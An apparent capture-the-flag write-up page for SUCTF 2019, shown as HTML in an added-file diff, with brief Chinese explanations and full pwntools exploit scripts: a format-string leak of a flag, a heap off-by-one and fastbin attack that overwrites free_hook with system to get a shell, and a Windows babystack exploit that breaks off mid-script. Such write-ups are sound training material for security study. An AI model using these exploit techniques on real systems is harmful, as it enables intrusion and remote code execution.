@@ -1,0 +1,1587 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/safari_pinned_tab.svg?v=6.5.0" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="pwnplayfmt发现栈中留有栈指针和堆指针,通过%?$n修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的flag,%s打印即可. 123456789101112131415161718192021222324252627282930313233343536from pwn import *#context.log_level = &apos;debug&apos;#r = process(&quot;./playf">
+<meta name="keywords" content="Jeopardy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="writeup-suctf-2019">
+<meta property="og:url" content="https://hitworld.github.io/posts/b0cce827/index.html">
+<meta property="og:site_name" content="w4rd3n">
+<meta property="og:description" content="pwnplayfmt发现栈中留有栈指针和堆指针,通过%?$n修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的flag,%s打印即可. 123456789101112131415161718192021222324252627282930313233343536from pwn import *#context.log_level = &apos;debug&apos;#r = process(&quot;./playf">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://hitworld.github.io/posts/b0cce827/1.png">
+<meta property="og:updated_time" content="2020-06-20T10:21:41.207Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="writeup-suctf-2019">
+<meta name="twitter:description" content="pwnplayfmt发现栈中留有栈指针和堆指针,通过%?$n修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的flag,%s打印即可. 123456789101112131415161718192021222324252627282930313233343536from pwn import *#context.log_level = &apos;debug&apos;#r = process(&quot;./playf">
+<meta name="twitter:image" content="https://hitworld.github.io/posts/b0cce827/1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://hitworld.github.io/posts/b0cce827/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>writeup-suctf-2019 | w4rd3n</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w4rd3n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">混吃等死</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>友链</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hitworld.github.io/posts/b0cce827/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w4rd3n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/apple-touch-icon.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w4rd3n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">writeup-suctf-2019
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-18 12:36:02" itemprop="dateCreated datePublished" datetime="2019-08-18T12:36:02+08:00">2019-08-18</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/posts/b0cce827/" class="leancloud_visitors" data-flag-title="writeup-suctf-2019">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">8.6k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">8 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="playfmt"><a href="#playfmt" class="headerlink" title="playfmt"></a>playfmt</h3><p>发现栈中留有栈指针和堆指针,通过<code>%?$n</code>修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的<code>flag</code>,<code>%s</code>打印即可.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process("./playfmt")</span></span><br><span class="line">r = remote(<span class="string">"120.78.192.35"</span>, <span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"=====================\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"=====================\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%18$p\n%6$p\nmvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">heap = int(r.recvuntil(<span class="string">"\n"</span>), <span class="number">16</span>) - <span class="number">0x18</span></span><br><span class="line">stack = int(r.recvuntil(<span class="string">"\n"</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"mvp"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span> + str((stack % <span class="number">0x100</span>) + <span class="number">0x10</span>) + <span class="string">"d%6$hhnmvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"mvp"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%16d%14$hhnmvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"mvp"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%18$smvp"</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"mvp"</span>)[:<span class="number">-3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br></pre></td></tr></table></figure>
+<h3 id="二手破电脑"><a href="#二手破电脑" class="headerlink" title="二手破电脑"></a>二手破电脑</h3><p><code>rename</code>的解密脚本.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">9</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> key[<span class="number">9</span>] = <span class="string">"Qf(&gt;qwd!"</span>;</span><br><span class="line">	buf[<span class="number">7</span>] = <span class="string">'!'</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">6</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">		<span class="keyword">for</span>(;;buf[i]++) &#123;</span><br><span class="line">			<span class="keyword">if</span>((((buf[i] | buf[i + <span class="number">1</span>]) &amp; ~(buf[i] &amp; buf[i + <span class="number">1</span>]) | i) &amp; ~((buf[i] | buf[i + <span class="number">1</span>]) &amp; ~(buf[i] &amp; buf[i + <span class="number">1</span>]) &amp; i)) == key[i]) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>comment</code>时未封闭字符串,<code>throwaa</code>泄露<code>heap</code>和<code>leak</code>.</p>
+<p><code>perchase</code>存在<code>off-by-one</code>.堆重叠后进行<code>fastbin attack</code>控制部分堆区,修改堆指针.</p>
+<p><code>rename</code>两次修改,首先将堆指针改为指向<code>free_hook</code>,再修改<code>free_hook</code>为<code>system</code>.<code>getshell</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">"linux"</span>, arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perchase</span><span class="params">(size, name, price)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Name length: '</span>, str(size))</span><br><span class="line">    r.sendafter(<span class="string">'Name: '</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Price: '</span>, str(price))</span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(index, content, score)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(index))</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.sendlineafter(<span class="string">'And its score: '</span>, str(score))</span><br><span class="line">    r.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">throwaa</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'your index: '</span>, str(index))</span><br><span class="line">    data = r.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span><span class="params">(index, content, xss)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Give me an index: '</span>, str(index))</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.sendlineafter(<span class="string">'Wanna get more power?(y/n)'</span>, <span class="string">'y'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Give me serial: '</span>, <span class="string">'e4SyD1C!'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Hey Pwner'</span>, xss)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./pwn')</span></span><br><span class="line">r = remote(<span class="string">"47.111.59.243"</span>, <span class="string">"10001"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">perchase(<span class="number">0xa0</span>, <span class="string">"a"</span> * <span class="number">0xa0</span>, <span class="number">0x40</span>)<span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">0x8c</span>, <span class="number">0x40</span>)</span><br><span class="line">perchase(<span class="number">0xa0</span>, <span class="string">"a"</span> * <span class="number">0xa0</span>, <span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line">comment(<span class="number">1</span>, <span class="string">"a"</span> * <span class="number">0x8c</span>, <span class="number">0x40</span>)</span><br><span class="line">throwaa(<span class="number">0</span>)</span><br><span class="line">perchase(<span class="number">0xa0</span>, <span class="string">"a"</span> * <span class="number">0xa0</span>, <span class="number">0x40</span>)<span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">1</span>, <span class="number">0x40</span>)</span><br><span class="line">libc = u32(throwaa(<span class="number">0</span>)[<span class="number">12</span>:<span class="number">16</span>]) - <span class="number">0x1b07b0</span></span><br><span class="line">throwaa(<span class="number">1</span>)</span><br><span class="line">perchase(<span class="number">0x140</span>, <span class="string">"a"</span> * <span class="number">0x140</span>, <span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>, <span class="string">"a"</span> * <span class="number">1</span>, <span class="number">0x40</span>)</span><br><span class="line">heap = u32(throwaa(<span class="number">0</span>)[<span class="number">8</span>:<span class="number">12</span>]) - <span class="number">0x61</span></span><br><span class="line">fake = <span class="string">"/bin/sh\x00"</span> * <span class="number">9</span> + <span class="string">"a"</span> * <span class="number">0xf0</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x161</span> - <span class="number">0x138</span> + <span class="number">0x190</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>);</span><br><span class="line">perchase(<span class="number">0x148</span>, fake, <span class="number">0x40</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment">#leak libc &amp; heap</span></span><br><span class="line"></span><br><span class="line">perchase(<span class="number">0x10</span>, <span class="string">"a"</span> * <span class="number">0x10</span>, <span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line">perchase(<span class="number">0x10</span>, <span class="string">"a"</span> * <span class="number">0x10</span>, <span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">perchase(<span class="number">0x10</span>, <span class="string">"a"</span> * <span class="number">0x10</span>, <span class="number">0x40</span>)<span class="comment">#3</span></span><br><span class="line">throwaa(<span class="number">1</span>)</span><br><span class="line">throwaa(<span class="number">2</span>)</span><br><span class="line">throwaa(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">perchase(<span class="number">0x3b</span>, <span class="string">"a"</span> * <span class="number">0x3b</span>, <span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line">perchase(<span class="number">0x188</span>, p32(<span class="number">0x100</span>) * (<span class="number">0x188</span> / <span class="number">4</span>), <span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">perchase(<span class="number">0x40</span>, <span class="string">"a"</span> * <span class="number">0x40</span>, <span class="number">0x40</span>)<span class="comment">#3</span></span><br><span class="line">perchase(<span class="number">0x40</span>, <span class="string">"a"</span> * <span class="number">0x40</span>, <span class="number">0x40</span>)<span class="comment">#4</span></span><br><span class="line">throwaa(<span class="number">2</span>)</span><br><span class="line">throwaa(<span class="number">1</span>)</span><br><span class="line">perchase(<span class="number">0x3c</span>, <span class="string">"a"</span> * <span class="number">0x3c</span>, <span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line">perchase(<span class="number">0xb8</span>, <span class="string">"a"</span> * <span class="number">0xb8</span>, <span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">perchase(<span class="number">0x38</span>, <span class="string">"a"</span> * <span class="number">0x38</span>, <span class="number">0x40</span>)<span class="comment">#5</span></span><br><span class="line">throwaa(<span class="number">2</span>)</span><br><span class="line">throwaa(<span class="number">3</span>)</span><br><span class="line">throwaa(<span class="number">5</span>)</span><br><span class="line">perchase(<span class="number">0x1d0</span>, <span class="string">"a"</span> * <span class="number">0xb8</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + p32(heap + <span class="number">0x178</span>) + <span class="string">"a"</span> * <span class="number">0x10c</span>, <span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">perchase(<span class="number">0x38</span>, <span class="string">"a"</span> * <span class="number">0x38</span>, <span class="number">0x40</span>)<span class="comment">#3</span></span><br><span class="line">fake = p32(<span class="number">0x150</span>) + p32(<span class="number">0x19</span>) + p32(<span class="number">0</span>) + p32(heap + <span class="number">0x38</span>)</span><br><span class="line">fake += p32(<span class="number">0x40</span>) * <span class="number">2</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x19</span>) + p32(<span class="number">0</span>) + p32(heap + <span class="number">0x178</span>) + p32(<span class="number">0x40</span>) + p32(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p32(<span class="number">0x19</span>)</span><br><span class="line">perchase(<span class="number">0x38</span>, fake, <span class="number">0x40</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Give me an index: '</span>, str(<span class="number">2</span>))</span><br><span class="line">fake = p32(<span class="number">0x150</span>) + p32(<span class="number">0x19</span>) + p32(<span class="number">0</span>) * <span class="number">3</span> + p32(heap + <span class="number">0x38</span>)</span><br><span class="line">fake += p32(libc + <span class="number">0x1b18b0</span>) * <span class="number">10</span></span><br><span class="line">r.send(fake)</span><br><span class="line">r.sendlineafter(<span class="string">'Wanna get more power?(y/n)'</span>, <span class="string">'y'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Give me serial: '</span>, <span class="string">'e4SyD1C!'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Hey Pwner'</span>, p32(libc + <span class="number">0x3a940</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>主函数没有漏洞,通过<code>IDA</code>的<code>Strings</code>窗口进行交叉引用发现漏洞函数<code>sub_407F60</code>.</p>
+<p>发现套路和<code>hitb-gsec-2017</code>的<code>babystack</code>很像,修改<code>payload</code>即可.</p>
+<p>这里触发异常需要利用这段汇编,只要<code>esi</code>为<code>0</code>即可触发除<code>0</code>异常,实际上就是让输入等于返回地址.</p>
+<img src="/posts/b0cce827/1.png" title="p1">
+<hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwintools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = Process(<span class="string">"babystack.exe"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"stack address = 0x"</span>)</span><br><span class="line">stack = int(r.recvline()[:<span class="number">-2</span>], <span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">"main address = 0x"</span>)</span><br><span class="line">main = int(r.recvline()[:<span class="number">-2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"main: "</span> + hex(main)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(hex(main - <span class="number">0x395e</span> + <span class="number">0x8551</span>))</span><br><span 